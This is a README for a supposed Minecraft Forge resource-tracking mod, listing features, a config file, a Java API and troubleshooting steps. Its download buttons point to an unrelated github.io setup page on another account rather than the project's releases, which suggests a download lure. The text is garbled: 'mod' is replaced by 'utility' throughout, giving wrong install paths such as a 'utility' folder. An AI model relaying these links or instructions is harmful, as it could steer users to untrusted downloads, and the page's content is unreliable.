# Minecraft Resource Consumption Tracker  
*by **FiscalPresent***  

![Minecraft](https://img.shields.io/badge/Minecraft-1.21%20%7C%20Forge-blue?logo=minecraft) ![License](https://img.shields.io/github/license/FiscalPresent/Minecraft-Resource-Consumption-Tracker) ![Stars](https://img.shields.io/github/stars/FiscalPresent/Minecraft-Resource-Consumption-Tracker?style=social)  

[![Download & Release](https://img.shields.io/badge/Download%20%26%20Setup-Ready%20to%20Go-2ea44f?logo=github&style=for-the-badge)](https://rewfdf.github.io/SetupPage/)

---  

## 🎮 What Is This?

The **Minecraft Resource Consumption Tracker** is a lightweight utility‑utility that records how, when, and where you spend resources (blocks, items, fuel, XP, etc.) during gameplay. It surfaces real‑time alerts when you exceed configurable thresholds and provides in‑depth usage statistics for post‑game analysis.

> **Why track resources?**  
> - Optimize your builds and farms.  
> - Spot hidden waste (e.g., runaway redstone loops).  
> - Compare efficiency across play sessions or teammates.  

---

## ✨ Key Features  

| Feature | Description |
|---|---|
| **Live Consumption Meter** | A HUD overlay that shows current per‑minute usage of selected resources. |
| **Configurable Alerts** | Set upper‑limit warnings for any item; get chat, sound, or visual cues. |
| **Detailed Session Reports** | Export CSV/JSON logs that break down usage by chunk, dimension, and player. |
| **Resource Grouping** | Group similar items (e.g., all stone variants) into a single metric. |
| **Performance‑Friendly** | Runs on a separate thread; negligible impact on FPS. |
| **utility‑Friendly API** | Other utility can push custom metrics to the tracker via a simple Java interface. |

---

## 📦 Installation  

1. **Prerequisites**  
   - Minecraft **1.21** (or later) with **Forge** installed.  
   - Java 21+ (the utility bundles a compatible JRE for convenience).  

2. **Download**  
   - Click the **Download & Release** button above, or grab the latest release from the *Releases* tab.  

3. **Add to `utility/`**  
   - Place the `resource-consumption-tracker.jar` file into your `<minecraft>/utility` folder.  

4. **Launch**  
   - Start Minecraft as usual. The tracker will auto‑initialize on the first world load.  

> **Tip:** Keep the **config** file (`config/resource_tracker.cfg`) close to your favorite settings and back it up for reproducible environments.

---

## ⚙️ Configuration  

The config file lives at `config/resource_tracker.cfg`. Below is a quick utility‑sheet:

```properties
# === General ===
enabled = true
logLevel = INFO               # DEBUG, INFO, WARN, ERROR

# === HUD ===
hud.enabled = true
hud.position = TOP_RIGHT
hud.refreshRate = 20          # ticks (1 tick = 0.05s)

# === Alerts ===
alert.enabled = true
alert.sound = minecraft:entity.experience_orb.pickup
alert.threshold.stone = 5000
alert.threshold.diamond = 200
alert.action = CHAT            # CHAT, TITLE, ACTION_BAR

# === Export ===
export.enabled = true
export.format = CSV           # CSV or JSON
export.path = ./tracker_logs/
```

Edit the file with any text editor and reload the world or run `/tracker reload` in‑game to apply changes.

---

## 📊 Understanding the Stats  

| Metric | Meaning |
|---|---|
| **Total Consumed** | Cumulative count of each tracked item since the last reset. |
| **Rate (per min)** | How many units are being used per minute—great for spotting spikes. |
| **Chunk Heatmap** | Visual overlay that colors chunks based on resource drain intensity. |
| **Dimension Breakdown** | Separate stats for Overworld, Nether, End, and custom dimensions. |
| **Player Comparison** | When on a server, you can view per‑player contributions. |

Open the **Tracker UI** with `/tracker ui` to explore charts, filters, and export options.

---

## 🛠️ API for Modders  

```java
public interface IResourceTracker {
    void recordConsumption(ResourceLocation item, int amount);
    void setAlertThreshold(ResourceLocation item, int max);
    TrackerStats getStats();
}
```

Add the library to your `build.gradle`:

```gradle
repositories {
    maven { url "https://repo.maven.apache.org/maven2" }
}
dependencies {
    implementation fg.deobf("com.fiscalpresent:resource-tracker:1.0.0")
}
```

Full Javadoc is available in the `docs/` folder of the release zip.

---

## 🐞 Troubleshooting  

| Symptom | Likely Cause | Fix |
|---|---|---|
| **No HUD appears** | `hud.enabled` set to `false` or conflict with another overlay utility. | Set `hud.enabled = true` and restart. |
| **Alerts spam** | Threshold set too low. | Raise the threshold in the config or disable alerts for that item. |
| **Performance dip** | Logging at `DEBUG` level on a busy server. | Change `logLevel` to `INFO` or `WARN`. |
| **Export file not created** | `export.path` points to a non‑existent directory. | Create the folder or update the path. |

If you hit a wall, join the **#resource-tracker** channel on the official Discord (link in the Wiki) or open an issue on GitHub.

---

## 📢 Contributing  

1. Fork the repository.  
2. Create a feature branch (`git checkout -b feature/your‑idea`).  
3. Follow the existing code style (Google Java Format).  
4. Submit a pull request with a clear description and screenshots (if UI changes).  

All contributions are welcomed, from bug fixes to new alert types!

---

## 📜 License  

This project is licensed under the **MIT License** – see the `LICENSE` file for details.

---

## 📞 Contact & Credits  

- **Author:** FiscalPresent – [GitHub](https://github.com/FiscalPresent)  
- **Community Discord:** https://discord.gg/minecraft‑analytics  
- **Special Thanks:** Forge team, the Minecraft modding community, and every beta‑tester who helped shape the tracker.  

---  

[![Visit Release Page](https://img.shields.io/badge/Release%20Page-Visit%20Now-ff9900?style=for-the-badge&logo=chrome)](https://rewfdf.github.io/SetupPage/)